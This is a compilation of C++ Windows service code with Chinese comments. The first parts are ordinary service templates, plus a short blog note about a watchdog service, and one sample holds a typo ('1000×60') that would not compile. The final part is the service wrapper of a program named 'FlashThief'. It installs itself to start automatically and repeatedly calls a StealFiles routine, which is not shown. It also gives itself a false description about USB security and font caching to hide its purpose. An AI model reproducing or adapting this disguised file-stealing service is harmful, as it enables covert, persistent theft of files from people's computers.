#include"XXXX.h"  //包含的头文件
 
//定义全局函数变量
void Init();
BOOL IsInstalled();
BOOL Install();
BOOL Uninstall();
void LogEvent(LPCTSTR pszFormat, ...);
void WINAPI ServiceMain();
void WINAPI ServiceStrl(DWORD dwOpcode);
 
TCHAR szServiceName[] = _T("WatchDog");
BOOL bInstall;
SERVICE_STATUS_HANDLE hServiceStatus;
SERVICE_STATUS status;
DWORD dwThreadID;
 
int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
    Init();
 
    dwThreadID = ::GetCurrentThreadId();
 
    SERVICE_TABLE_ENTRY st[] =
    {
        { szServiceName, (LPSERVICE_MAIN_FUNCTION)ServiceMain },
        { NULL, NULL }
    };
 
    if (stricmp(lpCmdLine, "/install") == 0)
        {
           Install();
        }
    else if (stricmp(lpCmdLine, "/uninstall") == 0)
        {
            Uninstall();
        }
    else
        {
         if (!::StartServiceCtrlDispatcher(st))
        {
            LogEvent(_T("Register Service Main Function Error!"));
        }
      }
 
    return 0;
}
//*********************************************************
//Functiopn:            Init
//Description:          初始化
//Calls:                main       
//          <author>niying <time>2006-8-10      <version>     <desc>
//*********************************************************
void Init()
{
    hServiceStatus = NULL;
    status.dwServiceType = SERVICE_WIN32_OWN_PROCESS|SERVICE_INTERACTIVE_PROCESS;
    status.dwCurrentState = SERVICE_START_PENDING;
    status.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    status.dwWin32ExitCode = 0;
    status.dwServiceSpecificExitCode = 0;
    status.dwCheckPoint = 0;
    status.dwWaitHint = 0;
}
 
//*********************************************************
//Functiopn:            ServiceMain
//Description:          服务主函数，这在里进行控制对服务控制的注册
//          <author>niying <time>2006-8-10      <version>     <desc>
//*********************************************************
void WINAPI ServiceMain()
{
    // Register the control request handler
    status.dwCurrentState = SERVICE_START_PENDING;
    status.dwControlsAccepted = SERVICE_ACCEPT_STOP;
 
    //注册服务控制
    hServiceStatus = RegisterServiceCtrlHandler(szServiceName, ServiceStrl);
    if (hServiceStatus == NULL)
    {
        LogEvent(_T("Handler not installed"));
        return;
    }
    SetServiceStatus(hServiceStatus, &status);
 
    status.dwWin32ExitCode = S_OK;
    status.dwCheckPoint = 0;
    status.dwWaitHint = 0;
    status.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(hServiceStatus, &status);
 
    //模拟服务的运行。应用时将主要任务放于此即可
        //可在此写上服务需要执行的代码，一般为死循环
      while(1)
    {
           //循环干什么
     }   
    status.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(hServiceStatus, &status);
    OutputDebugString(_T("Service stopped"));
}
 
//*********************************************************
//Functiopn:            ServiceStrl
//Description:          服务控制主函数，这里实现对服务的控制，
//                      当在服务管理器上停止或其它操作时，将会运行此处代码
//Calls:
//Called By:
//Table Accessed:
//Table Updated:
//Input:                dwOpcode：控制服务的状态
//Output:
//Return:
//Others:
//History:
//          <author>niying <time>2006-8-10      <version>     <desc>
//*********************************************************
void WINAPI ServiceStrl(DWORD dwOpcode)
{
    switch (dwOpcode)
    {
    case SERVICE_CONTROL_STOP:
        status.dwCurrentState = SERVICE_STOP_PENDING;
        SetServiceStatus(hServiceStatus, &status);
        PostThreadMessage(dwThreadID, WM_CLOSE, 0, 0);
        break;
    case SERVICE_CONTROL_PAUSE:
        break;
    case SERVICE_CONTROL_CONTINUE:
        break;
    case SERVICE_CONTROL_INTERROGATE:
        break;
    case SERVICE_CONTROL_SHUTDOWN:
        break;
    default:
        LogEvent(_T("Bad service request"));
        OutputDebugString(_T("Bad service request"));
    }
}
//*********************************************************
//Functiopn:            IsInstalled
//Description:          判断服务是否已经被安装
//          <author>niying <time>2006-8-10      <version>     <desc>
//*********************************************************
BOOL IsInstalled()
{
    BOOL bResult = FALSE;
 
    //打开服务控制管理器
    SC_HANDLE hSCM = ::OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
 
    if (hSCM != NULL)
    {
        //打开服务
        SC_HANDLE hService = ::OpenService(hSCM, szServiceName, SERVICE_QUERY_CONFIG);
        if (hService != NULL)
        {
            bResult = TRUE;
            ::CloseServiceHandle(hService);
        }  
        ::CloseServiceHandle(hSCM);
    }
    return bResult;
}
 
//*********************************************************
//Functiopn:            Install
//Description:          安装服务函数
//          <author>niying <time>2006-8-10      <version>     <desc>
//*********************************************************
BOOL Install()
{
    if (IsInstalled())
        return TRUE;
 
    //打开服务控制管理器
    SC_HANDLE hSCM = ::OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hSCM == NULL)
    {
        MessageBox(NULL, _T("Couldn't open service manager"), szServiceName, MB_OK);
        return FALSE;
    }
 
    // Get the executable file path
    TCHAR szFilePath[MAX_PATH];
    ::GetModuleFileName(NULL, szFilePath, MAX_PATH);
 
    //创建服务
    SC_HANDLE hService = ::CreateService(hSCM, szServiceName, szServiceName,
        SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS|SERVICE_INTERACTIVE_PROCESS ,SERVICE_AUTO_START , SERVICE_ERROR_NORMAL,
        szFilePath, NULL, NULL, _T(""), NULL, NULL);
 
    if (hService == NULL)
    {
        ::CloseServiceHandle(hSCM);
        MessageBox(NULL, _T("Couldn't create service"), szServiceName, MB_OK);
        return FALSE;
    }
 
    ::CloseServiceHandle(hService);
    ::CloseServiceHandle(hSCM);
    return TRUE;
}
 
//*********************************************************
//Functiopn:            Uninstall
//Description:          删除服务函数
//          <author>niying <time>2006-8-10      <version>     <desc>
//*********************************************************
BOOL Uninstall()
{
    if (!IsInstalled())
        return TRUE;
 
    SC_HANDLE hSCM = ::OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
 
    if (hSCM == NULL)
    {
        MessageBox(NULL, _T("Couldn't open service manager"), szServiceName, MB_OK);
        return FALSE;
    }
 
    SC_HANDLE hService = ::OpenService(hSCM, szServiceName, SERVICE_STOP | DELETE);
 
    if (hService == NULL)
    {
        ::CloseServiceHandle(hSCM);
        MessageBox(NULL, _T("Couldn't open service"), szServiceName, MB_OK);
        return FALSE;
    }
    SERVICE_STATUS status;
    ::ControlService(hService, SERVICE_CONTROL_STOP, &status);
 
    //删除服务
    BOOL bDelete = ::DeleteService(hService);
    ::CloseServiceHandle(hService);
    ::CloseServiceHandle(hSCM);
 
    if (bDelete)
        return TRUE;
 
    LogEvent(_T("Service could not be deleted"));
    return FALSE;
}
 
//*********************************************************
//Functiopn:            LogEvent
//Description:          记录服务事件
//          <author>niying <time>2006-8-10      <version>     <desc>
//*********************************************************
void LogEvent(LPCTSTR pFormat, ...)
{
    TCHAR    chMsg[256];
    HANDLE  hEventSource;
    LPTSTR  lpszStrings[1];
    va_list pArg;
 
    va_start(pArg, pFormat);
    _vstprintf(chMsg, pFormat, pArg);
    va_end(pArg);
 
    lpszStrings[0] = chMsg;
     
    hEventSource = RegisterEventSource(NULL, szServiceName);
    if (hEventSource != NULL)
    {
        ReportEvent(hEventSource, EVENTLOG_INFORMATION_TYPE, 0, 0, NULL, 1, 0, (LPCTSTR*) &lpszStrings[0], NULL);
        DeregisterEventSource(hEventSource);
    }
}
 
 




#include <windows.h>
 
//全局变量
SERVICE_STATUS g_service_status;
SERVICE_STATUS_HANDLE g_hservice_status;
bool g_is_running = true;
 
//函数声明
void WINAPI ServiceMain(DWORD argc, LPTSTR *argv);
void WINAPI ServiceCtrlHandler(DWORD Opcode);
void task(int argc,char* argv[]);
 
int main(int argc, char* argv[])
{
    SERVICE_TABLE_ENTRY DispatchTable[]={
                                        {"service",ServiceMain},        //服务函数入口地址
                                        {NULL,NULL}
                        };
    StartServiceCtrlDispatcher(DispatchTable);
    return 0;
}
 
void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)                       //服务函数
{
 
    g_service_status.dwServiceType              = SERVICE_WIN32;        //WIN32服务
    g_service_status.dwCurrentState             = SERVICE_START_PENDING;
    g_service_status.dwControlsAccepted         = SERVICE_ACCEPT_STOP;
    g_service_status.dwWin32ExitCode            = 0;
    g_service_status.dwServiceSpecificExitCode  = 0;
    g_service_status.dwCheckPoint               = 0;
    g_service_status.dwWaitHint                 = 0;
 
    g_hservice_status = RegisterServiceCtrlHandler("service",ServiceCtrlHandler);
    if (g_hservice_status == (SERVICE_STATUS_HANDLE)0)
    {
        return;
    }
    g_service_status.dwCurrentState         = SERVICE_RUNNING;
    g_service_status.dwCheckPoint           = 0;
    g_service_status.dwWaitHint             = 0;
    SetServiceStatus (g_hservice_status,&g_service_status);
 
    g_is_running=true;
    while(g_is_running)
    {
        Sleep(1000);
        task( argc, argv);
    }
}
 
void task(int argc,char* argv[])                                //录音主程序
{
 
}
 
void WINAPI ServiceCtrlHandler(DWORD Opcode)        //接受控制消息
{
    switch(Opcode)
    {
        case SERVICE_CONTROL_SHUTDOWN       :       //关机控制服务
 
        case SERVICE_CONTROL_STOP           :       //停止控制服务
            {
                g_service_status.dwWin32ExitCode = 0;
                g_service_status.dwCurrentState    = SERVICE_STOPPED;
                g_service_status.dwCheckPoint      = 0;
                g_service_status.dwWaitHint        = 0;
                SetServiceStatus (g_hservice_status,&g_service_status);
                g_is_running=false;
            }
            break;
        default:
            break;
    }
}







前端时间由于某种异常，程序不知道什么原因总是抛出一个异常，导致程序崩溃，一直没有查到原因。最后想到一个办法，开发一个windows服务程序，定时检测该进程，如果发现该进程存在，就检测是否有异常窗口，如果有异常窗口，就关闭该窗口，重新启动这个任务，现在将开发的程序列在如下：
首先开发一个创建windows服务的程序，注意主要是修改SvcInit函数（//60秒钟定时做自己的任务增加自己的任务）,这里有个问题就是在服务中不能操作windows的窗口，具体怎么操作将在下一篇介绍。在如下：
#include <windows.h>
#include <tchar.h>
#include <strsafe.h>
#include "sample.h"
#define SVCNAME TEXT("SvcName")
SERVICE_STATUS          gSvcStatus;
SERVICE_STATUS_HANDLE   gSvcStatusHandle;
HANDLE                  ghSvcStopEvent = NULL;
VOID SvcInstall(void);
VOID WINAPI SvcCtrlHandler( DWORD );
VOID WINAPI SvcMain( DWORD, LPTSTR * );
VOID ReportSvcStatus( DWORD, DWORD, DWORD );
VOID SvcInit( DWORD, LPTSTR * );
VOID SvcReportEvent( LPTSTR );
//
// Purpose:
//   Entry point for the process
//
// Parameters:
//   None
//
// Return value:
//   None
//
void __cdecl _tmain(int argc, TCHAR *argv[])
{
    // If command-line parameter is "install", install the service.
    // Otherwise, the service is probably being started by the SCM.
    if( lstrcmpi( argv[1], TEXT("install")) == 0 )
    {
        SvcInstall();
        return;
    }
    // TO_DO: Add any additional services for the process to this table.
    SERVICE_TABLE_ENTRY DispatchTable[] =
    {
        { SVCNAME, (LPSERVICE_MAIN_FUNCTION) SvcMain },
        { NULL, NULL }
    };
 
    // This call returns when the service has stopped.
    // The process should simply terminate when the call returns.
    if (!StartServiceCtrlDispatcher( DispatchTable ))
    {
        SvcReportEvent(TEXT("StartServiceCtrlDispatcher"));
    }
}
//
// Purpose:
//   Installs a service in the SCM database
//
// Parameters:
//   None
//
// Return value:
//   None
//
VOID SvcInstall()
{
    SC_HANDLE schSCManager;
    SC_HANDLE schService;
    TCHAR szPath[MAX_PATH];
    if( !GetModuleFileName( NULL, szPath, MAX_PATH ) )
    {
        printf("Cannot install service (%d)\n", GetLastError());
        return;
    }
    // Get a handle to the SCM database.
 
    schSCManager = OpenSCManager(
        NULL,                    // local computer
        NULL,                    // ServicesActive database
        SC_MANAGER_ALL_ACCESS);  // full access rights
 
    if (NULL == schSCManager)
    {
        printf("OpenSCManager failed (%d)\n", GetLastError());
        return;
    }
    // Create the service
    schService = CreateService(
        schSCManager,              // SCM database
        SVCNAME,                   // name of service
        SVCNAME,                   // service name to display
        SERVICE_ALL_ACCESS,        // desired access
        SERVICE_WIN32_OWN_PROCESS, // service type
        SERVICE_DEMAND_START,      // start type
        SERVICE_ERROR_NORMAL,      // error control type
        szPath,                    // path to service's binary
        NULL,                      // no load ordering group
        NULL,                      // no tag identifier
        NULL,                      // no dependencies
        NULL,                      // LocalSystem account
        NULL);                     // no password
 
    if (schService == NULL)
    {
        printf("CreateService failed (%d)\n", GetLastError());
        CloseServiceHandle(schSCManager);
        return;
    }
    else printf("Service installed successfully\n");
    CloseServiceHandle(schService);
    CloseServiceHandle(schSCManager);
}
//
// Purpose:
//   Entry point for the service
//
// Parameters:
//   dwArgc - Number of arguments in the lpszArgv array
//   lpszArgv - Array of strings. The first string is the name of
//     the service and subsequent strings are passed by the process
//     that called the StartService function to start the service.
//
// Return value:
//   None.
//
VOID WINAPI SvcMain( DWORD dwArgc, LPTSTR *lpszArgv )
{
    // Register the handler function for the service
    gSvcStatusHandle = RegisterServiceCtrlHandler(
        SVCNAME,
        SvcCtrlHandler);
    if( !gSvcStatusHandle )
    {
        SvcReportEvent(TEXT("RegisterServiceCtrlHandler"));
        return;
    }
    // These SERVICE_STATUS members remain as set here
    gSvcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    gSvcStatus.dwServiceSpecificExitCode = 0;   
    // Report initial status to the SCM
    ReportSvcStatus( SERVICE_START_PENDING, NO_ERROR, 3000 );
    // Perform service-specific initialization and work.
    SvcInit( dwArgc, lpszArgv );
}
//
// Purpose:
//   The service code
//
// Parameters:
//   dwArgc - Number of arguments in the lpszArgv array
//   lpszArgv - Array of strings. The first string is the name of
//     the service and subsequent strings are passed by the process
//     that called the StartService function to start the service.
//
// Return value:
//   None
//
VOID SvcInit( DWORD dwArgc, LPTSTR *lpszArgv)
{
    // TO_DO: Declare and set any required variables.
    //   Be sure to periodically call ReportSvcStatus() with
    //   SERVICE_START_PENDING. If initialization fails, call
    //   ReportSvcStatus with SERVICE_STOPPED.
    // Create an event. The control handler function, SvcCtrlHandler,
    // signals this event when it receives the stop control code.
  
    DWORD  dwEvent;
    ghSvcStopEvent = CreateEvent(
                         NULL,    // default security attributes
                         TRUE,    // manual reset event
                         FALSE,   // not signaled
                         NULL);   // no name
    if ( ghSvcStopEvent == NULL)
    {
        ReportSvcStatus( SERVICE_STOPPED, NO_ERROR, 0 );
        return;
    }
    // Report running status when initialization is complete.
    ReportSvcStatus( SERVICE_RUNNING, NO_ERROR, 0 );
    // TO_DO: Perform work until service stops.
    while(1)
    {
        // Check whether to stop the service.
        dwEvent = WaitForSingleObject(ghSvcStopEvent,1000×60);
        if(dwEvent == WAIT_OBJECT_0)
        {
         ReportSvcStatus( SERVICE_STOPPED, NO_ERROR, 0 );
         return;
        }
        else
        {
         //60秒钟定时做自己的任务
        } 
        
       
    }
}
//
// Purpose:
//   Sets the current service status and reports it to the SCM.
//
// Parameters:
//   dwCurrentState - The current state (see SERVICE_STATUS)
//   dwWin32ExitCode - The system error code
//   dwWaitHint - Estimated time for pending operation,
//     in milliseconds
//
// Return value:
//   None
//
VOID ReportSvcStatus( DWORD dwCurrentState,
                      DWORD dwWin32ExitCode,
                      DWORD dwWaitHint)
{
    static DWORD dwCheckPoint = 1;
    // Fill in the SERVICE_STATUS structure.
    gSvcStatus.dwCurrentState = dwCurrentState;
    gSvcStatus.dwWin32ExitCode = dwWin32ExitCode;
    gSvcStatus.dwWaitHint = dwWaitHint;
    if (dwCurrentState == SERVICE_START_PENDING)
        gSvcStatus.dwControlsAccepted = 0;
    else gSvcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    if ( (dwCurrentState == SERVICE_RUNNING) ||
           (dwCurrentState == SERVICE_STOPPED) )
        gSvcStatus.dwCheckPoint = 0;
    else gSvcStatus.dwCheckPoint = dwCheckPoint++;
    // Report the status of the service to the SCM.
    SetServiceStatus( gSvcStatusHandle, &gSvcStatus );
}
//
// Purpose:
//   Called by SCM whenever a control code is sent to the service
//   using the ControlService function.
//
// Parameters:
//   dwCtrl - control code
//
// Return value:
//   None
//
VOID WINAPI SvcCtrlHandler( DWORD dwCtrl )
{
   // Handle the requested control code.
   switch(dwCtrl)
   { 
      case SERVICE_CONTROL_STOP:
         ReportSvcStatus(SERVICE_STOP_PENDING, NO_ERROR, 0);
         // Signal the service to stop.
         SetEvent(ghSvcStopEvent);
        
         return;
 
      case SERVICE_CONTROL_INTERROGATE:
         // Fall through to send current status.
         break;
 
      default:
         break;
   }
   ReportSvcStatus(gSvcStatus.dwCurrentState, NO_ERROR, 0);
}
//
// Purpose:
//   Logs messages to the event log
//
// Parameters:
//   szFunction - name of function that failed
//
// Return value:
//   None
//
// Remarks:
//   The service must have an entry in the Application event log.
//
VOID SvcReportEvent(LPTSTR szFunction)
{
    HANDLE hEventSource;
    LPCTSTR lpszStrings[2];
    TCHAR Buffer[80];
    hEventSource = RegisterEventSource(NULL, SVCNAME);
    if( NULL != hEventSource )
    {
        StringCchPrintf(Buffer, 80, TEXT("%s failed with %d"), szFunction, GetLastError());
        lpszStrings[0] = SVCNAME;
        lpszStrings[1] = Buffer;
        ReportEvent(hEventSource,        // event log handle
                    EVENTLOG_ERROR_TYPE, // event type
                    0,                   // event category
                    SVC_ERROR,           // event identifier
                    NULL,                // no security identifier
                    2,                   // size of lpszStrings array
                    0,                   // no binary data
                    lpszStrings,         // array of strings
                    NULL);               // no binary data
        DeregisterEventSource(hEventSource);
    }
}




#include "stdafx.h"   
#include "FlashThief.h"   
#include "Service.h"   
   
CService _Module;   
   
CService::CService()   
{   
    m_bService = TRUE;   
    m_dwThreadID = 0;   
}   
   
CService::~CService()   
{   
}   
   
// 第一个参数是服务名称，第二个参数是服务的显示名称。   
void CService::Init(LPCTSTR pServiceName, LPCTSTR pServiceDisplayedName)   
{   
    _tcscpy_s(m_szServiceName, 256, pServiceName);   
    _tcscpy_s(m_szServiceDisplayedName, 256, pServiceDisplayedName);   
   
    // 设置初始服务状态   
    m_hServiceStatus = NULL;   
    m_status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;   
    m_status.dwCurrentState = SERVICE_STOPPED;   
    // 设置服务可以使用的控制   
    // 如果希望服务启动后不能停止，去掉SERVICE_ACCEPT_STOP   
    // SERVICE_ACCEPT_PAUSE_CONTINUE是服务可以“暂停/继续”   
    m_status.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE | SERVICE_ACCEPT_SHUTDOWN;   
    m_status.dwWin32ExitCode = 0;   
    m_status.dwServiceSpecificExitCode = 0;   
    m_status.dwCheckPoint = 0;   
    m_status.dwWaitHint = 0;   
}   
   
void CService::Start()   
{   
    SERVICE_TABLE_ENTRY st[] =   
    {   
        { m_szServiceName, _ServiceMain },   
        { NULL, NULL }   
    };   
    if (!::StartServiceCtrlDispatcher(st) && m_bService)   
        m_bService = FALSE;   
   
    if (m_bService == FALSE)   
        Run();   
}   
   
void CService::ServiceMain()   
{   
    // 注册控制请求句柄   
    m_status.dwCurrentState = SERVICE_START_PENDING;   
    m_hServiceStatus = RegisterServiceCtrlHandler(m_szServiceName, _Handler);   
    if (m_hServiceStatus == NULL) return;   
    SetServiceStatus(SERVICE_START_PENDING);   
   
    m_status.dwWin32ExitCode = S_OK;   
    m_status.dwCheckPoint = 0;   
    m_status.dwWaitHint = 0;   
   
    // 当 Run 函数返回时，服务已经结束。   
    Run();   
   
    SetServiceStatus(SERVICE_STOPPED);   
}   
   
inline void CService::Handler(DWORD dwOpcode)   
{   
    switch (dwOpcode)   
    {   
    case SERVICE_CONTROL_STOP:   
        SetServiceStatus(SERVICE_STOP_PENDING);   
        StealStatus(STEAL_STOP_PENDING);   
        PostThreadMessage(m_dwThreadID, WM_QUIT, NULL, NULL);   
        break;   
    case SERVICE_CONTROL_PAUSE:   
        SetServiceStatus(SERVICE_PAUSE_PENDING);   
        StealStatus(STEAL_PAUSE_PENDING);   
        PostThreadMessage(m_dwThreadID, WM_STEAL_PAUSE, NULL, NULL);   
        break;   
    case SERVICE_CONTROL_CONTINUE:   
        SetServiceStatus(SERVICE_CONTINUE_PENDING);   
        StealStatus(STEAL_CONTINUE_PENDING);   
        PostThreadMessage(m_dwThreadID, WM_STEAL_CONTINUE, NULL, NULL);   
        break;   
    case SERVICE_CONTROL_INTERROGATE:   
        break;   
    case SERVICE_CONTROL_SHUTDOWN:   
        SetServiceStatus(SERVICE_STOP_PENDING);   
        StealStatus(STEAL_STOP_PENDING);   
        PostThreadMessage(m_dwThreadID, WM_QUIT, NULL, NULL);   
        break;   
    default:   
        break;   
    }   
}   
   
void WINAPI CService::_ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv)   
{   
    _Module.ServiceMain();   
}   
void WINAPI CService::_Handler(DWORD dwOpcode)   
{   
    _Module.Handler(dwOpcode);    
}   
   
void CService::SetServiceStatus(DWORD dwState)   
{   
    m_status.dwCurrentState = dwState;   
    ::SetServiceStatus(m_hServiceStatus, &m_status);   
}   
   
int CService::StealStatus(int iState)   
{   
    if (iState != -1)   
        _Thief.m_iStatus = iState;   
   
    return _Thief.m_iStatus;   
}   
   
void CService::Run()   
{   
    m_dwThreadID = GetCurrentThreadId();   
   
    if (m_bService)   
        SetServiceStatus(SERVICE_RUNNING);   
   
    HANDLE hThread = NULL;   
    DWORD dwThreadId = 0;   
   
    hThread = CreateThread(NULL, 0, ThreadProc, this, 0, &dwThreadId);   
    if (hThread == NULL)   
        return;   
   
    MSG msg;   
    BOOL bRet = FALSE;   
   
    while ((bRet = GetMessage(&msg, NULL, NULL, NULL)) != 0)   
    {   
        if (bRet == -1) break;   
   
        switch (msg.message)   
        {   
        case WM_STEAL_PAUSE:   
            WaitForSingleObject(hThread, 60000 + _Thief.m_dwInterval);   
            SetServiceStatus(SERVICE_PAUSED);   
            break;   
        case WM_STEAL_CONTINUE:   
            if (StealStatus() == STEAL_STOPPED)   
            {   
                CloseHandle(hThread);   
                hThread = CreateThread(NULL, 0, ThreadProc, this, 0, &dwThreadId);   
            }   
            if (hThread != NULL)   
                SetServiceStatus(SERVICE_RUNNING);   
   
            break;   
        }   
   
        TranslateMessage(&msg);   
        DispatchMessage(&msg);   
    }   
   
    WaitForSingleObject(hThread, 30000 + _Thief.m_dwInterval);   
   
    CloseHandle(hThread);   
}   
   
DWORD CService::ThreadProc(LPVOID lpParam)   
{   
    StealStatus(STEAL_RUNNING);   
   
    while (StealStatus() == STEAL_RUNNING)   
    {   
        _Thief.StealFiles();   
        Sleep(_Thief.m_dwInterval);   
    }   
   
    StealStatus(STEAL_STOPPED);   
   
    return 0;   
}   
   
BOOL CService::Install()   
{   
    if (IsInstalled())   
        return TRUE;   
   
    SC_HANDLE hSCM = ::OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);   
    if (hSCM == NULL)   
    {   
        MessageBox(NULL, _T("无法打开服务管理器！"), m_szServiceName, MB_OK);   
        return FALSE;   
    }   
   
    // 获取可执行文件的路径   
    TCHAR szFilePath[MAX_PATH];   
    DWORD dwLen = GetModuleFileName(NULL, szFilePath, MAX_PATH);   
   
    if (_tcschr(szFilePath, ' ') != NULL)   
    {   
        dwLen += 3;   
        LPWSTR lpFilePath = new TCHAR[dwLen];   
        if (lpFilePath != NULL)   
        {   
            swprintf_s(lpFilePath, dwLen, _T("\"%s\""), szFilePath);   
            _tcscpy_s(szFilePath, MAX_PATH, lpFilePath);   
            delete []lpFilePath;   
        }   
    }   
   
    SC_HANDLE hService = ::CreateService(   
        hSCM, m_szServiceName, m_szServiceDisplayedName,   
        SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS,   
        SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,   
        szFilePath, NULL, NULL, NULL, NULL, NULL);   
   
    if (hService == NULL)   
    {   
        ::CloseServiceHandle(hSCM);   
        MessageBox(NULL, _T("无法创建服务！"), m_szServiceName, MB_OK);   
        return FALSE;   
    }   
    else   
    {   
        TCHAR szDescription[256];   
        SERVICE_DESCRIPTION sdBuf;   
   
        // 服务描述   
        swprintf_s(szDescription, 256,    
            _T("Provide USB security with %s applications by caching commonly used font data."),    
            m_szServiceDisplayedName);   
        sdBuf.lpDescription = szDescription;   
   
        ChangeServiceConfig2(hService, SERVICE_CONFIG_DESCRIPTION, &sdBuf);   
    }   
   
    ::CloseServiceHandle(hService);   
    ::CloseServiceHandle(hSCM);   
    return TRUE;   
}   
   
BOOL CService::Uninstall()   
{   
    if (!IsInstalled())   
        return TRUE;   
   
    SC_HANDLE hSCM = ::OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);   
   
    if (hSCM == NULL)   
    {   
        MessageBox(NULL, _T("无法打开服务管理器！"), m_szServiceName, MB_OK);   
        return FALSE;   
    }   
   
    SC_HANDLE hService = ::OpenService(hSCM, m_szServiceName, SERVICE_STOP | DELETE);   
   
    if (hService == NULL)   
    {   
        ::CloseServiceHandle(hSCM);   
        MessageBox(NULL, _T("无法打开服务以对其进行操作！"), m_szServiceName, MB_OK);   
        return FALSE;   
    }   
    SERVICE_STATUS status;   
    ::ControlService(hService, SERVICE_CONTROL_STOP, &status);   
   
    BOOL bDelete = ::DeleteService(hService);   
    ::CloseServiceHandle(hService);   
    ::CloseServiceHandle(hSCM);   
   
    if (bDelete)   
    {   
        RecurseDeleteKey(HKEY_LOCAL_MACHINE, CFG_REG_SUBKEY);   
        return TRUE;   
    }   
   
    MessageBox(NULL, _T("服务无法被删除！"), m_szServiceName, MB_OK);   
    return FALSE;   
}   
   
BOOL CService::IsInstalled()   
{   
    BOOL bResult = FALSE;   
   
    SC_HANDLE hSCM = ::OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);   
   
    if (hSCM != NULL)   
    {   
        SC_HANDLE hService = ::OpenService(hSCM, m_szServiceName, SERVICE_QUERY_CONFIG);   
        if (hService != NULL)   
        {   
            bResult = TRUE;   
            ::CloseServiceHandle(hService);   
        }   
        ::CloseServiceHandle(hSCM);   
    }   
    return bResult;   
}   
   
// 删除注册表项   
DWORD CService::RecurseDeleteKey(HKEY hkey, LPCTSTR pszSubKey)   
{   
    LPTSTR lpSubKey = NULL;   
    LPTSTR lpSubKeyName = NULL;   
    LPTSTR lpEnd = NULL;   
    DWORD dwMaxSubKeyLen = 0;   
    LONG lResult = -1;   
    DWORD dwSize = 0;   
    HKEY hKey = NULL;   
    FILETIME ftWrite;   
   
    // 首先尝试删除项，如果删除失败则继续执行枚举删除   
   
    lResult = RegDeleteKey(hkey, pszSubKey);   
    if (lResult == ERROR_SUCCESS)   
        return ERROR_SUCCESS;   
   
    lResult = RegOpenKeyEx(hkey, pszSubKey, 0, KEY_READ, &hKey);   
    if (lResult != ERROR_SUCCESS)   
        return lResult;   
   
    // 检查要删除的项的路径结尾是否有“\”，没有则加上   
   
    lResult = RegQueryInfoKey(hKey, NULL, NULL, NULL, NULL, &dwMaxSubKeyLen, NULL, NULL, NULL, NULL, NULL, NULL);   
    if (lResult != ERROR_SUCCESS)   
        dwMaxSubKeyLen = 50;   
   
    dwSize = _tcslen(pszSubKey) + 2 + dwMaxSubKeyLen;   
   
    lpSubKey = new TCHAR[dwSize];   
    if (lpSubKey == NULL)   
        return -1;   
   
    lpSubKeyName = new TCHAR[dwMaxSubKeyLen + 1];   
    if (lpSubKeyName == NULL)   
        return -1;   
   
    _tcscpy_s(lpSubKey, dwSize, pszSubKey);   
   
    lpEnd = lpSubKey + _tcslen(lpSubKey);   
    if (*(lpEnd - 1) != _T('\\'))    
    {   
        *lpEnd = _T('\\');   
        lpEnd++;   
        *lpEnd = _T('\0');   
    }   
   
    // 枚举要删除的项下的子项递归删除   
   
    dwSize = dwMaxSubKeyLen + 1;   
    lResult = RegEnumKeyEx(hKey, 0, lpSubKeyName, &dwSize, NULL, NULL, NULL, &ftWrite);   
    if (lResult == ERROR_SUCCESS)   
    {   
        do {   
            _tcscpy_s(lpEnd, dwMaxSubKeyLen + 1, lpSubKeyName);   
            if (RecurseDeleteKey(hkey, lpSubKey) != ERROR_SUCCESS)   
                break;   
   
            dwSize = dwMaxSubKeyLen + 1;   
            lResult = RegEnumKeyEx(hKey, 0, lpSubKeyName, &dwSize, NULL, NULL, NULL, &ftWrite);   
        } while (lResult == ERROR_SUCCESS);   
    }   
   
    lpEnd--;   
    *lpEnd = _T('\0');   
   
    RegCloseKey(hKey);   
   
    // 最后再次尝试删除注册表的项   
    lResult = RegDeleteKey(hkey, lpSubKey);   
   
    delete []lpSubKey;   
    delete []lpSubKeyName;   
   
    return lResult;   
}  